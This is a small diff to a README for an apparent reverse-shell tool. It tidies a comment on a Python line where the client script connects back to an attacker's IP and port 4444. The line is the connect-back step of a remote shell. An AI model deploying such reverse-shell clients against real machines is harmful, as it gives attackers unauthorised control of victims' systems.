@@ -98,7 +98,7 @@ Open the client script you intend to run (`windows_reverce.py`, `linux_reverce.p
 
 ```python
 # windows_reverce.py (example snippet)
-s.connect(("192.168.1.100", 4444))  <<==# Attacker's IP and Port 
+s.connect(("192.168.1.100", 4444))  #<<== Attacker's IP and Port 
 ```
 
 **Steps**
